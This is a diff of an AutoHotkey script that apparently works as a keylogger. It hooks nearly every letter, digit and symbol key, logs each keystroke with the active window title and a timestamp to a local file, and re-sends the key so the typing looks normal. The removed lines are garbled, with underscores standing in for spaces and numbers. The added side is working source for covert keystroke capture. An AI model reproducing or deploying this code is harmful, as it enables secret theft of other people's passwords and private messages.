@@ -1,163 +1,163 @@
-﻿;;__Developed__By__Me
-;http://www.codeforme.digital/?code=__
-;https://www.youtube.com/watch?v=Rxdi_ktWZzI
+﻿;; Developed By Me
+;http://www.codeforme.digital/?code=41
+;https://www.youtube.com/watch?v=Rxdi9ktWZzI
 
 ;#NoTrayIcon
-#SingleInstance,__force
-SetTitleMatchMode,___
-str__:=__""
-oldTitle__:=__""
-writekeys(str,__oldTitle){
-	file__:=__FileOpen("a.txt",__"a")
-	file.Write("`r`n"__oldTitle__"`r`n"__str__"`r`n__------------------")
+#SingleInstance, force
+SetTitleMatchMode, 2
+str := ""
+oldTitle := ""
+writekeys(str, oldTitle){
+	file := FileOpen("a.txt", "a")
+	file.Write("`r`n" oldTitle "`r`n" str "`r`n ------------------")
 	file.Close()
 }
 setkey(key){
-	;~__global__str
-	;~__global__oldTitle
-	FormatTime,__myTime,__A_Now,__h:mm:ss__tt
-	FormatTime,__myDate,__A_Now,__dd/MM/yyyy
-	date___:=__Format("{}{}__",key,TimeNow)
-	WinGetTitle,__currentTitle,__A
+	;~ global str
+	;~ global oldTitle
+	FormatTime, myTime, A_Now, h:mm:ss tt
+	FormatTime, myDate, A_Now, dd/MM/yyyy
+	date_ := Format("{}{} ",key,TimeNow)
+	WinGetTitle, currentTitle, A
 	
-	if__FileExist("a.txt")
+	if FileExist("a.txt")
 	{
-		FileRead,OutFile,__a.txt
-		;~__s__[]__:=__StrSplit(currentTitle,'-')[_]
-		;~__MsgBox__%__s
+		FileRead,OutFile, a.txt
+		;~ s []  := StrSplit(currentTitle,'-')[2]
+		;~ MsgBox % s
 		
 
-		;;__unique__windows__title__in__file
-		if__inStr(OutFile,__StrSplit(currentTitle,"-__")[_])
+		;; unique windows title in file
+		if inStr(OutFile, StrSplit(currentTitle,"- ")[2])
 		{
-			;;__Check__if__date__exist
-			if__(inStr(OutFile,myDate))
+			;; Check if date exist
+			if (inStr(OutFile,myDate))
 			{
 				
-				if__inStr(OutFile,__"-|"__LTrim(StrSplit(currentTitle,"-__")[_]))
+				if inStr(OutFile, "-|" LTrim(StrSplit(currentTitle,"- ")[2]))
 				{
-					posStr__:=__InStr(OutFile,"-|"__LTrim(StrSplit(currentTitle,"-__")[_]))
-					delimStr__:=__SubStr(OutFile,posStr,StrLen("-|"__LTrim(StrSplit(currentTitle,"-__")[_])))
-					if__(key__=__"`r`n")
+					posStr := InStr(OutFile,"-|" LTrim(StrSplit(currentTitle,"- ")[2]))
+					delimStr := SubStr(OutFile,posStr,StrLen("-|" LTrim(StrSplit(currentTitle,"- ")[2])))
+					if (key = "`r`n")
 					{
-						key__:=__Format("{}{}__||__",key,myTime)
-						key__:=__key__"-|"__LTrim(StrSplit(currentTitle,"-__")[_])
-						newContent__:=__StrReplace(OutFile,delimStr,key)
+						key := Format("{}{} || ",key,myTime)
+						key := key "-|" LTrim(StrSplit(currentTitle,"- ")[2])
+						newContent := StrReplace(OutFile,delimStr,key)
 					}
 					else
 					{
-						key__:=__key__"-|"__LTrim(StrSplit(currentTitle,"-__")[_])
-						newContent__:=__StrReplace(OutFile,delimStr,key)
+						key := key "-|" LTrim(StrSplit(currentTitle,"- ")[2])
+						newContent := StrReplace(OutFile,delimStr,key)
 					}
 
-					FileDelete,__a.txt
-					FileAppend,__%newContent%,__a.txt
+					FileDelete, a.txt
+					FileAppend, %newContent%, a.txt
 				}
 				else
 				{
-					posStr__:=__InStr(OutFile,"-|"__LTrim(StrSplit(currentTitle,"-__")[_]))
-					delimStr__:=__SubStr(OutFile,posStr,StrLen("-|"__LTrim(StrSplit(currentTitle,"-__")[_])))
-					if__(key__=__"`r`n")
+					posStr := InStr(OutFile,"-|" LTrim(StrSplit(currentTitle,"- ")[2]))
+					delimStr := SubStr(OutFile,posStr,StrLen("-|" LTrim(StrSplit(currentTitle,"- ")[2])))
+					if (key = "`r`n")
 					{
-						key__:=__Format("{}{}__||__",key,myTime)
-						key__:=__key__"-|"__LTrim(StrSplit(currentTitle,"-__")[_])
-						newContent__:=__StrReplace(OutFile,delimStr,key)
+						key := Format("{}{} || ",key,myTime)
+						key := key "-|" LTrim(StrSplit(currentTitle,"- ")[2])
+						newContent := StrReplace(OutFile,delimStr,key)
 					}
 					else
 					{
-						key__:=__key__"-|"__LTrim(StrSplit(currentTitle,"-__")[_])
-						newContent__:=__StrReplace(OutFile,delimStr,key)
+						key := key "-|" LTrim(StrSplit(currentTitle,"- ")[2])
+						newContent := StrReplace(OutFile,delimStr,key)
 					}
 					
-					;~__key__:=__key__"-|"__LTrim(StrSplit(currentTitle,"-__")[_])
-					;~__newContent__:=__StrReplace(OutFile,delimStr,key)
-					FileDelete,__a.txt
-					FileAppend,__%newContent%,__a.txt
+					;~ key := key "-|" LTrim(StrSplit(currentTitle,"- ")[2])
+					;~ newContent := StrReplace(OutFile,delimStr,key)
+					FileDelete, a.txt
+					FileAppend, %newContent%, a.txt
 
-					;~__file__:=__FileOpen("a.txt",__"a")
-					;~__file.Write(key)
-					;~__file.Close()
+					;~ file := FileOpen("a.txt", "a")
+					;~ file.Write(key)
+					;~ file.Close()
 					
 					}
 			}
 			else
 			{
-				key__:=__key__"-|"__LTrim(StrSplit(currentTitle,"-__")[_])
-				file__:=__FileOpen("a.txt",__"a")
-				file.Write(Format("`r`n[{}]`r`n{}__||__",myDate,myTime))
+				key := key "-|" LTrim(StrSplit(currentTitle,"- ")[2])
+				file := FileOpen("a.txt", "a")
+				file.Write(Format("`r`n[{}]`r`n{} || ",myDate,myTime))
 				file.Write(key)
 				file.Close()
 			}
 		}
 		else
 		{
-			key__:=__key__"-|"__LTrim(StrSplit(currentTitle,"-__")[_])
-			file__:=__FileOpen("a.txt",__"a")
-			file.Write("`r`n------------------`r`n"__currentTitle__"`r`n------------------`r`n")
-			file.Write(Format("[{}]`r`n{}__||__",myDate,myTime))
+			key := key "-|" LTrim(StrSplit(currentTitle,"- ")[2])
+			file := FileOpen("a.txt", "a")
+			file.Write("`r`n------------------`r`n" currentTitle "`r`n------------------`r`n")
+			file.Write(Format("[{}]`r`n{} || ",myDate,myTime))
 			file.Write(key)
 			file.Close()
 		}
 		
-		;~__FileRead,OutFile,__a.txt
-		;~__if__inStr(OutFile,__currentTitle)
-		;~__{
-			;~__if__inStr(OutFile,__"|")
-			;~__{
-				;~__end__:=__inStr(OutFile,__"|")
-				;~__res__:=__"__"__key
-				;~__replace__:=__StrReplace(OutFile,__"|",__res)
-				;~__file__:=__FileOpen("a.txt",__"w")
-				;~__file.Write(replace)
-				;~__file.Close()
-			;~__}
-			;~__else
-			;~__{
-				;~__file__:=__FileOpen("a.txt",__"a")
-				;~__file.Write(key)
-				;~__file.Close()
-			;~__}
+		;~ FileRead,OutFile, a.txt
+		;~ if inStr(OutFile, currentTitle)
+		;~ {
+			;~ if inStr(OutFile, "|")
+			;~ {
+				;~ end := inStr(OutFile, "|")
+				;~ res := " " key
+				;~ replace := StrReplace(OutFile, "|", res)
+				;~ file := FileOpen("a.txt", "w")
+				;~ file.Write(replace)
+				;~ file.Close()
+			;~ }
+			;~ else
+			;~ {
+				;~ file := FileOpen("a.txt", "a")
+				;~ file.Write(key)
+				;~ file.Close()
+			;~ }
 				
-		;~__}
-		;~__else
-		;~__{
-			;~__;;__new__Program__Open
-			;~__file__:=__FileOpen("a.txt",__"a")
-			;~__file.Write("`r`n"__currentTitle__"`r`n__------------------")
-			;~__file.Close()
-		;~__}
+		;~ }
+		;~ else
+		;~ {
+			;~ ;; new Program Open
+			;~ file := FileOpen("a.txt", "a")
+			;~ file.Write("`r`n" currentTitle "`r`n ------------------")
+			;~ file.Close()
+		;~ }
 	}
 	else
 	{
-		key__:=__key__"-|"__LTrim(StrSplit(currentTitle,"-__")[_])
-		;~__start__:=__Format("{}",timeNow)
-		;~__if__(key__=__"`r`n")
-		;~__{
-			;~__key__:=__Format("{}{}__",key,TimeNow)
-		;~__}
-		file__:=__FileOpen("a.txt",__"a")
-		;~__file.Write("`r`n__------------------`"__currentTitle__"`r`n__------------------")
-		file.Write("------------------`r`n"__currentTitle__"`r`n------------------`r`n")
-		file.Write(Format("[{}]`r`n{}__||__",myDate,myTime))
+		key := key "-|" LTrim(StrSplit(currentTitle,"- ")[2])
+		;~ start := Format("{}",timeNow)
+		;~ if (key = "`r`n")
+		;~ {
+			;~ key := Format("{}{} ",key,TimeNow)
+		;~ }
+		file := FileOpen("a.txt", "a")
+		;~ file.Write("`r`n ------------------`" currentTitle "`r`n ------------------")
+		file.Write("------------------`r`n" currentTitle "`r`n------------------`r`n")
+		file.Write(Format("[{}]`r`n{} || ",myDate,myTime))
 		file.Write(key)
 		file.Close()
 	}
 	
-	;~__if(currentTitle__<>__oldTitle){
-		;~__;;__new__program__open
-		;~__writekeys(str,__oldTitle)
-		;~__str__:=""
-		;~__oldTitle__:=__currentTitle
-		;~__file__:=__FileOpen("a.txt",__"a")
-		;~__file.Write("`r`n"__oldTitle__"`r`n"__str__"`r`n__------------------")
-		;~__file.Write(key)
-	;~__}
-	;~__else
-	;~__{
-		;~__file__:=__FileOpen("a.txt",__"a")
-		;~__file.Write(key)
-	;~__}
-	;~__str__=__%str%%key%
+	;~ if(currentTitle <> oldTitle){
+		;~ ;; new program open
+		;~ writekeys(str, oldTitle)
+		;~ str :=""
+		;~ oldTitle := currentTitle
+		;~ file := FileOpen("a.txt", "a")
+		;~ file.Write("`r`n" oldTitle "`r`n" str "`r`n ------------------")
+		;~ file.Write(key)
+	;~ }
+	;~ else
+	;~ {
+		;~ file := FileOpen("a.txt", "a")
+		;~ file.Write(key)
+	;~ }
+	;~ str = %str%%key%
 	
 
 	
@@ -166,602 +166,602 @@ setkey(key){
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 a::
 	setkey("a")
-	hotkey,__a,__off
-	send,__a
-	hotkey,__a,__on
+	hotkey, a, off
+	send, a
+	hotkey, a, on
 return
 +a::
 	setkey("A")
-	hotkey,__+a,__off
-	send,__A
-	hotkey,__+a,__on
+	hotkey, +a, off
+	send, A
+	hotkey, +a, on
 return
 b::
 	setkey("b")
-	hotkey,__b,__off
-	send,__b
-	hotkey,__b,__on
+	hotkey, b, off
+	send, b
+	hotkey, b, on
 return
 +b::
 	setkey("B")
-	hotkey,__+b,__off
-	send,__B
-	hotkey,__+b,__on
+	hotkey, +b, off
+	send, B
+	hotkey, +b, on
 return
 c::
 	setkey("c")
-	hotkey,__c,__off
-	send,__c
-	hotkey,__c,__on
+	hotkey, c, off
+	send, c
+	hotkey, c, on
 return
 +c::
 	setkey("C")
-	hotkey,__+c,__off
-	send,__C
-	hotkey,__+c,__on
+	hotkey, +c, off
+	send, C
+	hotkey, +c, on
 return
 d::
 	setkey("d")
-	hotkey,__d,__off
-	send,__d
-	hotkey,__d,__on
+	hotkey, d, off
+	send, d
+	hotkey, d, on
 return
 +d::
 	setkey("D")
-	hotkey,__+d,__off
-	send,__D
-	hotkey,__+d,__on
+	hotkey, +d, off
+	send, D
+	hotkey, +d, on
 return
 e::
 	setkey("e")
-	hotkey,__e,__off
-	send,__e
-	hotkey,__e,__on
+	hotkey, e, off
+	send, e
+	hotkey, e, on
 return
 +e::
 	setkey("E")
-	hotkey,__+e,__off
-	send,__E
-	hotkey,__+e,__on
+	hotkey, +e, off
+	send, E
+	hotkey, +e, on
 return
 f::
 	setkey("f")
-	hotkey,__f,__off
-	send,__f
-	hotkey,__f,__on
+	hotkey, f, off
+	send, f
+	hotkey, f, on
 return
 +f::
 	setkey("F")
-	hotkey,__+f,__off
-	send,__F
-	hotkey,__+f,__on
+	hotkey, +f, off
+	send, F
+	hotkey, +f, on
 return
 g::
 	setkey("g")
-	hotkey,__g,__off
-	send,__g
-	hotkey,__g,__on
+	hotkey, g, off
+	send, g
+	hotkey, g, on
 return
 +g::
 	setkey("G")
-	hotkey,__+g,__off
-	send,__G
-	hotkey,__+g,__on
+	hotkey, +g, off
+	send, G
+	hotkey, +g, on
 return
 h::
 	setkey("h")
-	hotkey,__h,__off
-	send,__h
-	hotkey,__h,__on
+	hotkey, h, off
+	send, h
+	hotkey, h, on
 return
 +h::
 	setkey("H")
-	hotkey,__+h,__off
-	send,__H
-	hotkey,__+h,__on
+	hotkey, +h, off
+	send, H
+	hotkey, +h, on
 return
 i::
 	setkey("i")
-	hotkey,__i,__off
-	send,__i
-	hotkey,__i,__on
+	hotkey, i, off
+	send, i
+	hotkey, i, on
 return
 +i::
 	setkey("I")
-	hotkey,__+i,__off
-	send,__I
-	hotkey,__+i,__on
+	hotkey, +i, off
+	send, I
+	hotkey, +i, on
 return
 j::
 	setkey("j")
-	hotkey,__j,__off
-	send,__j
-	hotkey,__j,__on
+	hotkey, j, off
+	send, j
+	hotkey, j, on
 return
 +j::
 	setkey("J")
-	hotkey,__+j,__off
-	send,__J
-	hotkey,__+j,__on
+	hotkey, +j, off
+	send, J
+	hotkey, +j, on
 return
 k::
 	setkey("k")
-	hotkey,__k,__off
-	send,__k
-	hotkey,__k,__on
+	hotkey, k, off
+	send, k
+	hotkey, k, on
 return
 +k::
 	setkey("K")
-	hotkey,__+k,__off
-	send,__K
-	hotkey,__+k,__on
+	hotkey, +k, off
+	send, K
+	hotkey, +k, on
 return
 l::
 	setkey("l")
-	hotkey,__l,__off
-	send,__l
-	hotkey,__l,__on
+	hotkey, l, off
+	send, l
+	hotkey, l, on
 return
 +l::
 	setkey("L")
-	hotkey,__+l,__off
-	send,__L
-	hotkey,__+l,__on
+	hotkey, +l, off
+	send, L
+	hotkey, +l, on
 return
 m::
 	setkey("m")
-	hotkey,__m,__off
-	send,__m
-	hotkey,__m,__on
+	hotkey, m, off
+	send, m
+	hotkey, m, on
 return
 +m::
 	setkey("M")
-	hotkey,__+m,__off
-	send,__M
-	hotkey,__+m,__on
+	hotkey, +m, off
+	send, M
+	hotkey, +m, on
 return
 n::
 	setkey("n")
-	hotkey,__n,__off
-	send,__n
-	hotkey,__n,__on
+	hotkey, n, off
+	send, n
+	hotkey, n, on
 return
 +n::
 	setkey("N")
-	hotkey,__+n,__off
-	send,__N
-	hotkey,__+n,__on
+	hotkey, +n, off
+	send, N
+	hotkey, +n, on
 return
 o::
 	setkey("o")
-	hotkey,__o,__off
-	send,__o
-	hotkey,__o,__on
+	hotkey, o, off
+	send, o
+	hotkey, o, on
 return
 +o::
 	setkey("O")
-	hotkey,__+o,__off
-	send,__O
-	hotkey,__+o,__on
+	hotkey, +o, off
+	send, O
+	hotkey, +o, on
 return
 p::
 	setkey("p")
-	hotkey,__p,__off
-	send,__p
-	hotkey,__p,__on
+	hotkey, p, off
+	send, p
+	hotkey, p, on
 return
 +p::
 	setkey("P")
-	hotkey,__+p,__off
-	send,__P
-	hotkey,__+p,__on
+	hotkey, +p, off
+	send, P
+	hotkey, +p, on
 return
 q::
 	setkey("q")
-	hotkey,__q,__off
-	send,__q
-	hotkey,__q,__on
+	hotkey, q, off
+	send, q
+	hotkey, q, on
 return
 +q::
 	setkey("Q")
-	hotkey,__+q,__off
-	send,__Q
-	hotkey,__+q,__on
+	hotkey, +q, off
+	send, Q
+	hotkey, +q, on
 return
 r::
 	setkey("r")
-	hotkey,__r,__off
-	send,__r
-	hotkey,__r,__on
+	hotkey, r, off
+	send, r
+	hotkey, r, on
 return
 +r::
 	setkey("R")
-	hotkey,__+r,__off
-	send,__R
-	hotkey,__+r,__on
+	hotkey, +r, off
+	send, R
+	hotkey, +r, on
 return
 s::
 	setkey("s")
-	hotkey,__s,__off
-	send,__s
-	hotkey,__s,__on
+	hotkey, s, off
+	send, s
+	hotkey, s, on
 return
 +s::
 	setkey("S")
-	hotkey,__+s,__off
-	send,__S
-	hotkey,__+s,__on
+	hotkey, +s, off
+	send, S
+	hotkey, +s, on
 return
 t::
 	setkey("t")
-	hotkey,__t,__off
-	send,__t
-	hotkey,__t,__on
+	hotkey, t, off
+	send, t
+	hotkey, t, on
 return
 +t::
 	setkey("T")
-	hotkey,__+t,__off
-	send,__T
-	hotkey,__+t,__on
+	hotkey, +t, off
+	send, T
+	hotkey, +t, on
 return
 u::
 	setkey("u")
-	hotkey,__u,__off
-	send,__u
-	hotkey,__u,__on
+	hotkey, u, off
+	send, u
+	hotkey, u, on
 return
 +u::
 	setkey("U")
-	hotkey,__+u,__off
-	send,__U
-	hotkey,__+u,__on
+	hotkey, +u, off
+	send, U
+	hotkey, +u, on
 return
 v::
 	setkey("v")
-	hotkey,__v,__off
-	send,__v
-	hotkey,__v,__on
+	hotkey, v, off
+	send, v
+	hotkey, v, on
 return
 +v::
 	setkey("V")
-	hotkey,__+v,__off
-	send,__V
-	hotkey,__+v,__on
+	hotkey, +v, off
+	send, V
+	hotkey, +v, on
 return
 w::
 	setkey("w")
-	hotkey,__w,__off
-	send,__w
-	hotkey,__w,__on
+	hotkey, w, off
+	send, w
+	hotkey, w, on
 return
 +w::
 	setkey("W")
-	hotkey,__+w,__off
-	send,__W
-	hotkey,__+w,__on
+	hotkey, +w, off
+	send, W
+	hotkey, +w, on
 return
 x::
 	setkey("x")
-	hotkey,__x,__off
-	send,__x
-	hotkey,__x,__on
+	hotkey, x, off
+	send, x
+	hotkey, x, on
 return
 +x::
 	setkey("X")
-	hotkey,__+x,__off
-	send,__X
-	hotkey,__+x,__on
+	hotkey, +x, off
+	send, X
+	hotkey, +x, on
 return
 y::
 	setkey("y")
-	hotkey,__y,__off
-	send,__y
-	hotkey,__y,__on
+	hotkey, y, off
+	send, y
+	hotkey, y, on
 return
 +y::
 	setkey("Y")
-	hotkey,__+y,__off
-	send,__Y
-	hotkey,__+y,__on
+	hotkey, +y, off
+	send, Y
+	hotkey, +y, on
 return
 z::
 	setkey("z")
-	hotkey,__z,__off
-	send,__z
-	hotkey,__z,__on
+	hotkey, z, off
+	send, z
+	hotkey, z, on
 return
 +z::
 	setkey("Z")
-	hotkey,__+z,__off
-	send,__Z
-	hotkey,__+z,__on
+	hotkey, +z, off
+	send, Z
+	hotkey, +z, on
 return
 
 
-_::
-	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
+0::
+	setkey("0")
+	hotkey, 0, off
+	send, 0
+	hotkey, 0, on
 return
-_::
-	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
+1::
+	setkey("1")
+	hotkey, 1, off
+	send, 1
+	hotkey, 1, on
 return
-_::
-	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
+2::
+	setkey("2")
+	hotkey, 2, off
+	send, 2
+	hotkey, 2, on
 return
-_::
-	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
+3::
+	setkey("3")
+	hotkey, 3, off
+	send, 3
+	hotkey, 3, on
 return
-_::
-	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
+4::
+	setkey("4")
+	hotkey, 4, off
+	send, 4
+	hotkey, 4, on
 return
-_::
-	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
+5::
+	setkey("5")
+	hotkey, 5, off
+	send, 5
+	hotkey, 5, on
 return
-_::
-	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
+6::
+	setkey("6")
+	hotkey, 6, off
+	send, 6
+	hotkey, 6, on
 return
-_::
-	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
+7::
+	setkey("7")
+	hotkey, 7, off
+	send, 7
+	hotkey, 7, on
 return
-_::
-	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
+8::
+	setkey("8")
+	hotkey, 8, off
+	send, 8
+	hotkey, 8, on
 return
-_::
-	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
+9::
+	setkey("9")
+	hotkey, 9, off
+	send, 9
+	hotkey, 9, on
 return
-Numpad_::
-	setkey("_")
-	hotkey,__Numpad_,__off
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
-	hotkey,__Numpad_,__on
+Numpad0::
+	setkey("0")
+	hotkey, Numpad0, off
+	hotkey, 0, off
+	send, 0
+	hotkey, 0, on
+	hotkey, Numpad0, on
 return
-Numpad_::
-	setkey("_")
-	hotkey,__Numpad_,__off
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
-	hotkey,__Numpad_,__on
+Numpad1::
+	setkey("1")
+	hotkey, Numpad1, off
+	hotkey, 1, off
+	send, 1
+	hotkey, 1, on
+	hotkey, Numpad1, on
 return
-Numpad_::
-	setkey("_")
-	hotkey,__Numpad_,__off
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
-	hotkey,__Numpad_,__on
+Numpad2::
+	setkey("2")
+	hotkey, Numpad2, off
+	hotkey, 2, off
+	send, 2
+	hotkey, 2, on
+	hotkey, Numpad2, on
 return
-Numpad_::
-	setkey("_")
-	hotkey,__Numpad_,__off
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
-	hotkey,__Numpad_,__on
+Numpad3::
+	setkey("3")
+	hotkey, Numpad3, off
+	hotkey, 3, off
+	send, 3
+	hotkey, 3, on
+	hotkey, Numpad3, on
 return
-Numpad_::
-	setkey("_")
-	hotkey,__Numpad_,__off
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
-	hotkey,__Numpad_,__on
+Numpad4::
+	setkey("4")
+	hotkey, Numpad4, off
+	hotkey, 4, off
+	send, 4
+	hotkey, 4, on
+	hotkey, Numpad4, on
 return
-Numpad_::
-	setkey("_")
-	hotkey,__Numpad_,__off
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
-	hotkey,__Numpad_,__on
+Numpad5::
+	setkey("5")
+	hotkey, Numpad5, off
+	hotkey, 5, off
+	send, 5
+	hotkey, 5, on
+	hotkey, Numpad5, on
 return
-Numpad_::
-	setkey("_")
-	hotkey,__Numpad_,__off
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
-	hotkey,__Numpad_,__on
+Numpad6::
+	setkey("6")
+	hotkey, Numpad6, off
+	hotkey, 6, off
+	send, 6
+	hotkey, 6, on
+	hotkey, Numpad6, on
 return
-Numpad_::
-	setkey("_")
-	hotkey,__Numpad_,__off
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
-	hotkey,__Numpad_,__on
+Numpad7::
+	setkey("7")
+	hotkey, Numpad7, off
+	hotkey, 7, off
+	send, 7
+	hotkey, 7, on
+	hotkey, Numpad7, on
 return
-Numpad_::
-	setkey("_")
-	hotkey,__Numpad_,__off
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
-	hotkey,__Numpad_,__on
+Numpad8::
+	setkey("8")
+	hotkey, Numpad8, off
+	hotkey, 8, off
+	send, 8
+	hotkey, 8, on
+	hotkey, Numpad8, on
 return
-Numpad_::
-	setkey("_")
-	hotkey,__Numpad_,__off
-	hotkey,___,__off
-	send,___
-	hotkey,___,__on
-	hotkey,__Numpad_,__on
+Numpad9::
+	setkey("9")
+	hotkey, Numpad9, off
+	hotkey, 9, off
+	send, 9
+	hotkey, 9, on
+	hotkey, Numpad9, on
 return
 NumpadDiv::
 	setkey("/")
-	hotkey,__NumpadDiv,__off
-	hotkey,__/,__off
-	send,__/
-	hotkey,__/,__on
-	hotkey,__NumpadDiv,__on
+	hotkey, NumpadDiv, off
+	hotkey, /, off
+	send, /
+	hotkey, /, on
+	hotkey, NumpadDiv, on
 return
 NumpadMult::
 	setkey("*")
-	hotkey,__*,__off
-	hotkey,__NumpadMult,__off
-	send,__*
-	hotkey,__*,__on
-	hotkey,__NumpadMult,__on
+	hotkey, *, off
+	hotkey, NumpadMult, off
+	send, *
+	hotkey, *, on
+	hotkey, NumpadMult, on
 return
 NumpadAdd::
 	setkey("+")
-	hotkey,__+,__off
-	hotkey,__NumpadAdd,__off
-	sendraw,__+
-	hotkey,__NumpadAdd,__on
-	hotkey,__+,__on
+	hotkey, +, off
+	hotkey, NumpadAdd, off
+	sendraw, +
+	hotkey, NumpadAdd, on
+	hotkey, +, on
 return
 NumpadSub::
 	setkey("-")
-	hotkey,__-,__off
-	hotkey,__NumpadSub,__off
-	send,__-
-	hotkey,__NumpadSub,__on
-	hotkey,__-,__on
+	hotkey, -, off
+	hotkey, NumpadSub, off
+	send, -
+	hotkey, NumpadSub, on
+	hotkey, -, on
 return
 NumpadEnter::
 	setkey("`r`n")
-	hotkey,__NumpadEnter,__off
-	send,__{NumpadEnter}
-	hotkey,__NumpadEnter,__on
+	hotkey, NumpadEnter, off
+	send, {NumpadEnter}
+	hotkey, NumpadEnter, on
 return
 
 Enter::
 	setkey("`r`n")
-	hotkey,__Enter,__off
-	send,__{Enter}
-	hotkey,__Enter,__on
+	hotkey, Enter, off
+	send, {Enter}
+	hotkey, Enter, on
 return
 Space::
-	setkey("__")
-	hotkey,__Space,__off
-	send,__{Space}
-	hotkey,__Space,__on
+	setkey(" ")
+	hotkey, Space, off
+	send, {Space}
+	hotkey, Space, on
 return
 
 Backspace::
 	setkey("{Backspace}")
-	hotkey,__Backspace,__off
-	send,__{Backspace}
-	hotkey,__Backspace,__on
+	hotkey, Backspace, off
+	send, {Backspace}
+	hotkey, Backspace, on
 return
 
 
 .::
 	setkey(".")
-	hotkey,__.,__off
-	send,__.
-	hotkey,__.,__on
+	hotkey, ., off
+	send, .
+	hotkey, ., on
 return
 &::
 	setkey("&")
-	hotkey,__&,__off
-	send,__&
-	hotkey,&,__on
+	hotkey, &, off
+	send, &
+	hotkey,&, on
 return
 _::
 	setkey("_")
-	hotkey,___,__off
-	send,___
-	hotkey,_,__on
+	hotkey, _, off
+	send, _
+	hotkey,_, on
 return
 :::
 	setkey(":")
-	hotkey,__:,__off
-	send,__:
-	hotkey,:,__on
+	hotkey, :, off
+	send, :
+	hotkey,:, on
 return
 @::
 	setkey("@")
-	hotkey,__@,__off
-	send,__@
-	hotkey,@,__on
+	hotkey, @, off
+	send, @
+	hotkey,@, on
 return
 [::
 	setkey("[")
-	hotkey,__[,__off
-	send,__[
-	hotkey,[,__on
+	hotkey, [, off
+	send, [
+	hotkey,[, on
 return
 ]::
 	setkey("]")
-	hotkey,__],__off
-	send,__]
-	hotkey,],__on
+	hotkey, ], off
+	send, ]
+	hotkey,], on
 return
 )::
 	setkey(")")
-	hotkey,__),__off
-	send,__)
-	hotkey,__),__on
+	hotkey, ), off
+	send, )
+	hotkey, ), on
 return
 
 (::
 	setkey("(")
-	hotkey,__(,__off
-	send,__(
-	hotkey,__(,__on
+	hotkey, (, off
+	send, (
+	hotkey, (, on
 return
 
 
-;~__°::
-	;~__setkey("°")
-	;~__hotkey,__°,__off
-	;~__send,__°
-	;~__hotkey,__°,__on
-;~__return
+;~ °::
+	;~ setkey("°")
+	;~ hotkey, °, off
+	;~ send, °
+	;~ hotkey, °, on
+;~ return
 -::
 	setkey("-")
-	hotkey,__-,__off
-	sendraw,__-
-	hotkey,__-,__on
+	hotkey, -, off
+	sendraw, -
+	hotkey, -, on
 return
 +::
 	setkey("+")
-	hotkey,__+,__off
-	sendraw,__+
-	hotkey,__+,__on
+	hotkey, +, off
+	sendraw, +
+	hotkey, +, on
 return
 *::
 	setkey("*")
-	hotkey,__*,__off
-	send,__*
-	hotkey,__*,__on
+	hotkey, *, off
+	send, *
+	hotkey, *, on
 return
 =::
 	setkey("=")
-	hotkey,__=,__off
-	send,__=
-	hotkey,__=,__on
+	hotkey, =, off
+	send, =
+	hotkey, =, on
 return
